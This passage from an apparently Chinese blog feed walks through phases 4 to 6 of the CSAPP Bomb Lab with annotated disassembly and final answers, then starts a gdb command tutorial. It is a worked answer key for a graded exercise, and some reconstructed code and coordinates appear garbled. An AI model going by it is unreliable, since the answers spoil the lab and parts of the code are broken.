$0x18,%rsp</span><br><span class="line">   401010:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">   401015:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">   40101a:   be cf 25 40 00          mov    $0x4025cf,%esi</span><br><span class="line">   40101f:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">   401024:   e8 c7 fb ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   401029:   83 f8 02                cmp    $0x2,%eax            ; 需要输入2个参数</span><br><span class="line">   40102c:   75 07                   jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">   40102e:   83 7c 24 08 0e          cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   401033:   76 05                   jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">   401035:   e8 00 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">   40103a:   ba 0e 00 00 00          mov    $0xe,%edx            ; 构造函数参数3</span><br><span class="line">   40103f:   be 00 00 00 00          mov    $0x0,%esi            ; 构造函数参数2</span><br><span class="line">   401044:   8b 7c 24 08             mov    0x8(%rsp),%edi       ; 构造函数参数1 edi&#x3D;输入的第一个参数</span><br><span class="line">   401048:   e8 81 ff ff ff          callq  400fce &lt;func4&gt;       ; 进入func4函数</span><br><span class="line">   40104d:   85 c0                   test   %eax,%eax            ; 这行和下一行,要求func4返回的参数一定等于0</span><br><span class="line">   40104f:   75 07                   jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">   401051:   83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)       ; 第二参数为0</span><br><span class="line">   401056:   74 05                   je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">   401058:   e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">   40105d:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">   401061:   c3                      retq</span><br></pre></td></tr></table></figure><p>这是一个递归题目, 难点在参数1, 参数2的确定非常简单,直接为0.</p><p>而参数1,则需要带入到代码中,还原递归的过程.</p><p>还原为递归代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = z - y;</span><br><span class="line">    <span class="keyword">int</span> k = t  <span class="number">31</span>;</span><br><span class="line">    t = (t + k)  <span class="number">1</span>;</span><br><span class="line">    k = t + y;</span><br><span class="line">    <span class="keyword">if</span>(k &lt;= x) &#123;</span><br><span class="line">        t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(k &gt;= x) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            y = k + <span class="number">1</span>;</span><br><span class="line">            func4(x, y, z);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        z = k - <span class="number">1</span>;</span><br><span class="line">        func4(x, y, z);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终可注意到, x = 7 3 1都可以.</p><p>答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 0 或 3 0 或 1 0</span><br></pre></td></tr></table></figure><h2 id="5-phase-5"><a href="#5-phase-5" class="headerlink" title="5. phase 5"></a>5. phase 5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:   53                      push   %rbx</span><br><span class="line">  401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line">  401067:   48 89 fb                mov    %rdi,%rbx</span><br><span class="line">  40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  401071:   00 00 </span><br><span class="line">  401073:   48 89 44 24 18          mov    %rax,0x18(%rsp</span><br><span class="line">  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">  40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:   83 f8 06                cmp    $0x6,%eax            ; 输入6个字段</span><br><span class="line">  401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  -----------------------使用坐标 start-----------------------------------</span><br><span class="line">  40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx   ; rbx存放的的是输入字符串的首地址, rax是索引下表,所以这里时将输入的每个字符传递给ecx</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)           ;</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx          ; 取ecx的低16位给rdx</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx            ; 取ecx的低4位. </span><br><span class="line">  401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx  ;关键代码:以0x4024b0地址为基, 加上rdx偏移量,替换原有字符串. </span><br><span class="line">  4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line">  4010a8:   48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line">  4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  ----------------------使用坐标 end--------------------------------------</span><br><span class="line">  4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi       ; 关键代码, 查看内存地址空间0x40245e的字符串为 flyers, 比较前文获取的字符串是否等于flyers</span><br><span class="line">  4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi      ; </span><br><span class="line">  4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt; ;</span><br><span class="line">  4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">  4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:   00 00 </span><br><span class="line">  4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">  4010f2:   5b                      pop    %rbx</span><br><span class="line">  4010f3:   c3                      retq </span><br></pre></td></tr></table></figure><p>这个题相当有意思,给我一种破译密码的感觉.</p><p>可以理解为, 当前手上有一份加密码表, 我们要找到一个合适的坐标, 通过这个坐标去, 然后去密码表上查找对应码字,使得这些码字组成等于”flyers”.</p><p>解释:</p><ul><li>坐标: 就是我们要输入的字符串的每个字符. 然后取这些字符的低4位作为坐标</li><li>密码表: 0x4024b地址空间.得到坐标后, 查看以0x4024b为首地址的字符串加上这些坐标,得到解密后的码字.</li><li>目标码: 0x40245e地址空间. 我们解密出来的码字要等于这个地址空间所拥有的字符串, 经查看,为flyers</li></ul><p>另外,值得注意的是, 以字符的低4bit作为坐标, 这样会有多个字符有相同的低4bit. 查看acsii码表.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621224830418.png" alt="image-20200621224830418"></p><p>如果以数字表示坐标,则坐标为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 15 6 7</span><br></pre></td></tr></table></figure><p>对比acsii码:</p><p>第一个坐标9, 对应到acsii表的第9行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">) 9 I Y i y</span><br></pre></td></tr></table></figure><p>也就是说, 第一个坐标,可以是这6个字符中的任意一个.</p><p>同理,第二个坐标15, 也就是F行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; ? 0 _ o DEL</span><br></pre></td></tr></table></figure><p>最后, 个人答案:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span>/<span class="number">.567</span></span><br></pre></td></tr></table></figure><h2 id="6-phase-6"><a href="#6-phase-6" class="headerlink" title="6. phase 6"></a>6. phase 6</h2><p>phase 6是bomblab中最难的题, 我对代码做了详细的解释:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:       push   %r14</span><br><span class="line">  4010f6:       push   %r13</span><br><span class="line">  4010f8:       push   %r12</span><br><span class="line">  4010fa:       push   %rbp</span><br><span class="line">  4010fb:       push   %rbx</span><br><span class="line">  4010fc:       sub    $0x50,%rsp</span><br><span class="line">  401100:       mov    %rsp,%r13</span><br><span class="line">  401103:       mov    %rsp,%rsi</span><br><span class="line">  -----------------1.输入字段数是否为6检验 start--------------------------</span><br><span class="line">  401106:       callq  40145c &lt;read_six_numbers&gt; ; 读取6个字段</span><br><span class="line">  40110b:       mov    %rsp,%r14</span><br><span class="line">  40110e:       mov    $0x0,%r12d</span><br><span class="line">  -----------------2.输入的6个字段不能重复检验 start---------------------</span><br><span class="line">  401114:       mov    %r13,%rbp</span><br><span class="line">  401117:       mov    0x0(%r13),%eax</span><br><span class="line">  40111b:       sub    $0x1,%eax                ; eax &#x3D; eax -1</span><br><span class="line">  40111e:       cmp    $0x5,%eax                ; eax : 5</span><br><span class="line">  401121:       jbe    401128 &lt;phase_6+0x34&gt;    ; 相等,则通过, 这里是检验是否输入的是6个字段</span><br><span class="line">  401123:       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  -----------------1.输入字段数是否为6检验 end--------------------------</span><br><span class="line">  401128:       add    $0x1,%r12d</span><br><span class="line">  40112c:       cmp    $0x6,%r12d</span><br><span class="line">  401130:       je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:       mov    %r12d,%ebx</span><br><span class="line">  401135:       movslq %ebx,%rax               ; rax作为输入数组的索引下标</span><br><span class="line">  401138:       mov    (%rsp,%rax,4),%eax      ; 取出第rax个数,并存放在eax中</span><br><span class="line">  40113b:       cmp    %eax,0x0(%rbp)          ; rbp其实就是外部循环的被用来比较的数(设为x_i),eax是内部循环找到的数(设为x_j)  j &#x3D; i+1 到 5 ,i&#x3D;0 到5</span><br><span class="line">  40113e:       jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:       add    $0x1,%ebx               ; 内部循环+1</span><br><span class="line">  401148:       cmp    $0x5,%ebx</span><br><span class="line">  40114b:       jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:       add    $0x4,%r13               ; 外部循环+1</span><br><span class="line">  401151:       jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">  -----------------2.输入的6个字段不能重复检验 end---------------------</span><br><span class="line">  -----------------3. 所有数组元素x_&#123;i&#125; &#x3D; 7 - x&#123;i&#125; start--------------</span><br><span class="line">  401153:       lea    0x18(%rsp),%rsi         ; 指针走到数组头</span><br><span class="line">  401158:       mov    %r14,%rax</span><br><span class="line">  40115b:       mov    $0x7,%ecx               ; 7</span><br><span class="line">  401160:       mov    %ecx,%edx</span><br><span class="line">  401162:       sub    (%rax),%edx             ; x_i &#x3D; 7 - x_i</span><br><span class="line">  401164:       mov    %edx,(%rax)</span><br><span class="line">  401166:       add    $0x4,%rax               ; 指针+1</span><br><span class="line">  40116a:       cmp    %rsi,%rax               ; 是否走到数组尾</span><br><span class="line">  40116d:       jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line">  40116f:       mov    $0x0,%esi</span><br><span class="line">  401174:       jmp    401197 &lt;phase_6+0xa3&gt;   ; 这里直接产生了代码的跨越, 所以先调到 0x401197地址去看看</span><br><span class="line">  -----------------3. 所有数组元素x_&#123;i&#125; &#x3D; 7 - x&#123;i&#125; end--------------</span><br><span class="line">  -----------------4. 链表节点处理代码段(将链表节点地址移动到stack的内存中) start-----</span><br><span class="line">  401176:       mov    0x8(%rdx),%rdx</span><br><span class="line">  40117a:       add    $0x1,%eax</span><br><span class="line">  40117d:       cmp    %ecx,%eax</span><br><span class="line">  40117f:       jne    401176 &lt;phase_6+0x82&gt;   ; 找到链表中相应的元素.链表node结构中有一个类似id的字段, 目前的数组元素就是用来找到对应的id, id的范围是1-6</span><br><span class="line">  401181:       jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:       mov    $0x6032d0,%edx          ; 本题的关键, 查看0x6032d0内存地址空间, 你会发现这里有一个nodex的段, 可以猜想是某种数据结构, 链表&#x2F;tree&#x2F;图等, 通过更多的x打印,会发现大概率是链表结构</span><br><span class="line">  401188:       mov    %rdx,0x20(%rsp,%rsi,2)   ; 将链表的node地址,移动到stack空间去</span><br><span class="line">  40118d:       add    $0x4,%rsi                ; rsi指针+1</span><br><span class="line">  401191:       cmp    $0x18,%rsi               ; 是否走到数组尾</span><br><span class="line">  401195:       je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:       mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">  40119a:       cmp    $0x1,%ecx               ; 映射后的数组元素是否&lt;&#x3D;1</span><br><span class="line">  40119d:       jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:       mov    $0x1,%eax               ;</span><br><span class="line">  4011a4:       mov    $0x6032d0,%edx          ; 链表头节点地址</span><br><span class="line">  4011a9:       jmp    401176 &lt;phase_6+0x82&gt;   ; 跳转到链表节点处理代码段</span><br><span class="line">  -----------------4. 链表节点处理代码段(将链表节点地址移动到stack的内存中) end-----</span><br><span class="line">  -----------------5. 更新链表next指针(按照映射后的数组元素连接) start-------------</span><br><span class="line">  4011ab:       mov    0x20(%rsp),%rbx         ; 走到这里,说明0x6032d0内存地址中的所有链表node地址,都已经移动到了$rsp+0x20上的内存空间</span><br><span class="line">  4011b0:       lea    0x28(%rsp),%rax</span><br><span class="line">  4011b5:       lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:       mov    %rbx,%rcx</span><br><span class="line">  4011bd:       mov    (%rax),%rdx</span><br><span class="line">  4011c0:       mov    %rdx,0x8(%rcx)          ; 更新next指针</span><br><span class="line">  4011c4:       add    $0x8,%rax               ; 下一个链表node</span><br><span class="line">  4011c8:       cmp    %rsi,%rax               ; 是否移动到了最后一个node</span><br><span class="line">  4011cb:       je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:       mov    %rdx,%rcx</span><br><span class="line">  4011d0:       jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">  -----------------5. 更新链表next指针(按照映射后的数组元素连接) end-------------</span><br><span class="line">  4011d2:       movq   $0x0,0x8(%rdx)          ; 走到这里,说明链表已经重新连接成功</span><br><span class="line">  4011d9:</span><br><span class="line">  4011da:       mov    $0x5,%ebp</span><br><span class="line">  -----------------6. 验证链表是否是递减序列 start------------------------------</span><br><span class="line">  4011df:       mov    0x8(%rbx),%rax</span><br><span class="line">  4011e3:       mov    (%rax),%eax</span><br><span class="line">  4011e5:       cmp    %eax,(%rbx)</span><br><span class="line">  4011e7:       jge    4011ee &lt;phase_6+0xfa&gt;   ; 上一个node value &gt;下一个node value才能通过,所以要求的递减序列</span><br><span class="line">  4011e9:       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:       mov    0x8(%rbx),%rbx          ; 指向下一个node</span><br><span class="line">  4011f2:       sub    $0x1,%ebp               ; ebp &#x3D; ebp-1 , ebp从5减到0</span><br><span class="line">  4011f5:       jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  -----------------6. 验证链表是否是递减序列 end------------------------------</span><br><span class="line">  4011f7:       add    $0x50,%rsp</span><br><span class="line">  4011fb:       pop    %rbx</span><br><span class="line">  4011fc:       pop    %rbp</span><br><span class="line">  4011fd:       pop    %r12</span><br><span class="line">  4011ff:       pop    %r13</span><br><span class="line">  401201:       pop    %r14</span><br><span class="line">  401203:       retq   </span><br></pre></td></tr></table></figure><p>总体来说, 内存中存在一个6个节点的链表, </p><p>比如:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 -&gt; 55 -&gt; 15 -&gt; 57 -&gt; 12 -&gt; 412 -&gt; NULL</span><br></pre></td></tr></table></figure><p>我们输入6个数字, 然后经过 <strong>7 - 翻转</strong>来控制链表的排序. 举个例子:</p><p>例如: 输入 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 1 4 5 6</span><br></pre></td></tr></table></figure><p>则代码会将 每个元素 = 7 - 每个元素. 则输入变为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5 4 6 3 2 1</span><br></pre></td></tr></table></figure><p>然后用 <code>5 4 6 3 2 1</code>控制链表的排列, 得到:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12 -&gt; 57 -&gt; 412 -&gt; 15 -&gt; 55 -&gt; 41 -&gt; NULL</span><br></pre></td></tr></table></figure><p>最后检查排列的链表是否是降序的. 如果不是降序, 则bomb.</p><p>对于上面的链表,:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 -&gt; 55 -&gt; 15 -&gt; 57 -&gt; 12 -&gt; 412 -&gt; NULL</span><br></pre></td></tr></table></figure><p>正确答案应该为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 3 5 6 4 2</span><br></pre></td></tr></table></figure><p>至于题目中的链表是什么, 查看内存地址空间<strong>0x6032d0</strong>即可知道.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621225834535.png" alt="image-20200621225834535"></p><p>即:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">332 -&gt; 168 -&gt; 924 -&gt; 681 -&gt; 477 -&gt; 443 -&gt; NULL</span><br></pre></td></tr></table></figure><p>所以答案:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure><h2 id="7-个人调试经验"><a href="#7-个人调试经验" class="headerlink" title="7. 个人调试经验"></a>7. 个人调试经验</h2><p>第一次调试汇编， 整个过程并不算容易。前5道题目勉勉强强通过gdb调试出来了。 第6题， 只在gdb中调试， 调试了大半天也没能做出来。 因为gdb的显示空间有限， 而且无法添加注释。 所以后来选择通过objdump先把汇编dump出来， 在结合gdb一起看， 边看变写注释， 很快就能debug出来了。</p>]]></content>
      
      
      <categories>
          
          <category> Csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bomblab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gdb调试基础</title>
      <link href="/archives/37784c45.html"/>
      <url>/archives/37784c45.html</url>
      
        <content type="html"><![CDATA[<p>一直用惯了IDE集成的debug工具, 忽略了gdb这个命令行debug工具. 而最近在做csapp的bomblab, 就不得不来学习它了. 所以特此记录.</p><h2 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h2><p>考虑以下我们在IDE中要进行debug一般需要哪些功能?</p><ol><li>设置断点(包含条件断点)</li><li>开启debug</li><li>step in, step over, continue</li><li>观察某些值的变化, 打印数组value, 打印某个地址value</li><li>函数调用stack, 切换stack</li><li>临时更改某个变量,参数的值</li></ol><p>下面讲解如何用gdb实现这些功能。</p><p>为了更方便讲解, 这里提前把所有常用命令贴出, 读者可不用一一记住, 在逐渐使用的过程中,自然就能形成记住了.</p><a id="more"></a><table><thead><tr><th>命令</th><th>简写</th><th>含义</th></tr></thead><tbody><tr><td>list</td><td>l</td><td>列出10行代码</td></tr><tr><td>break</td><td>b</td><td>设置断点</td></tr><tr><td>break if</td><td>b if</td><td>设置条件断点</td></tr><tr><td>delete [break id]</td><td>d</td><td>删除断点047(按照break id)删除,没有break id,删除所有段6</td></tr><tr><td>disable</td><td></td><td>禁用断点</td></tr><tr><td>enable</td><td></td><td>允许断点</td></tr><tr><td>info</td><td>i</td><td>显示程序状态. info b(列出断点), info regs(列出寄存器)等</td></tr><tr><td>run [args]</td><td>r</td><td>开始运行程序, 可带参数</td></tr><tr><td>display</td><td>disp</td><td>跟踪查看那某个变量, 每次停下来都显示其值</td></tr><tr><td>print</td><td>p</td><td>打印内部变量值</td></tr><tr><td>watch</td><td></td><td>监视变量值新旧的变化</td></tr><tr><td>step</td><td>s</td><td>执行下一条语句，如果该语句为函数调用，则进入函数执行第一条语句</td></tr><tr><td>next</td><td>n</td><td>执行下一条语句,如果该语句为函数调用,不会进入函数内部执行(即不会一步步地调试函数内部语句）</td></tr><tr><td>continue</td><td>c</td><td>继续程序的运行，直到遇到下一个断点</td></tr><tr><td>finish</td><td></td><td>如果进入了某个函数，返回到调用调用它的函数，jump out</td></tr><tr><td>set var name = v</td><td></td><td>设置变量的值</td></tr><tr><td>backtrace</td><td>bt</td><td>查看函数调用信息（堆栈）</td></tr><tr><td>start</td><td>st</td><td>开始执行程序，在main函数中的第一条语句前停下</td></tr><tr><td>frame</td><td>f</td><td>查看栈帧，比如 frame 1 查看1号栈帧</td></tr><tr><td>up</td><td></td><td>查看上一个栈帧</td></tr><tr><td>down</td><td></td><td>查看那下一个栈帧</td></tr><tr><td>quit</td><td>q</td><td>离开gdb</td></tr><tr><td>edit</td><td></td><td>在gdb中进行编辑</td></tr><tr><td>whatis</td><td></td><td>查看变量的类型</td></tr><tr><td>search</td><td></td><td>搜索源文件中的文本</td></tr><tr><td>file</td><td></td><td>装入需要调试的程序</td></tr><tr><td>kill</td><td>k</td><td>终止正在调试的程序</td></tr><tr><td>layout</td><td></td><td>改变当前布局(必备命令)</td></tr><tr><td>examine</td><td>x</td><td>查看内存空间(必备命令)</td></tr><tr><td>checkpoint</td><td>ch</td><td>debug快照, 需要反复调试某一段代码时,非常有用</td></tr><tr><td>disassemble</td><td>disas</td><td>反汇编</td></tr><tr><td>stepi</td><td>si</td><td>下一行指令(遇到函数,进入函数)</td></tr><tr><td>nexti</td><td>ni</td><td>下一行指令</td></tr></tbody></table><p>这么多命令, 但是不要紧, 看完一个例子, 就掌握其中大半了.</p><p>example：</p><p>例子来自: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvZ2RiLWNvbW1hbmQtaW4tbGludXgtd2l0aC1leGFtcGxlcy8=" title="https://www.geeksforgeeks.org/gdb-command-in-linux-with-examples/">https://www.geeksforgeeks.org/gdb-command-in-linux-with-examples/<i class="fa fa-external-link"></i></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gfg.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findSquare</span><span class="params">(<span class="keyword">int</span> a)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> a * a; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span>** args)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> a = atoi(args[i]); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; findSquare(a) &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>通过g++进行编译, 注意编译参数需要添加”-g”:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -g -o gfg 